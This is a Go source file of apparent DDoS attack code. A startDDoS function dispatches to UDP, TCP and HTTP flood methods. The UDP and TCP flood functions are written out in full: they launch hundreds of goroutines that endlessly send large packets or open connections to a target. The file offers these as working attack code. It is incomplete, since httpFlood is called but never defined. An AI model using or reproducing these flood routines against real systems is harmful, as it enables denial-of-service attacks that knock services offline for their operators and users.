package main

import (
    "fmt"
    "net"
    "sync"
    "time"
)

func startDDoS(target, method string) {
    switch method {
    case "udp":
        udpFlood(target)
    case "tcp":
        tcpFlood(target)
    case "http":
        httpFlood(target)
    }
}

func udpFlood(target string) {
    addr, _ := net.ResolveUDPAddr("udp", target)
    var wg sync.WaitGroup
    
    for i := 0; i < 100; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            conn, _ := net.DialUDP("udp", nil, addr)
            payload := make([]byte, 65535)
            for {
                conn.Write(payload)
            }
        }()
    }
    wg.Wait()
}

func tcpFlood(target string) {
    for i := 0; i < 500; i++ {
        go func() {
            for {
                conn, err := net.Dial("tcp", target)
                if err == nil {
                    conn.Write(make([]byte, 1024))
                }
            }
        }()
    }
    select {} // Run forever
}
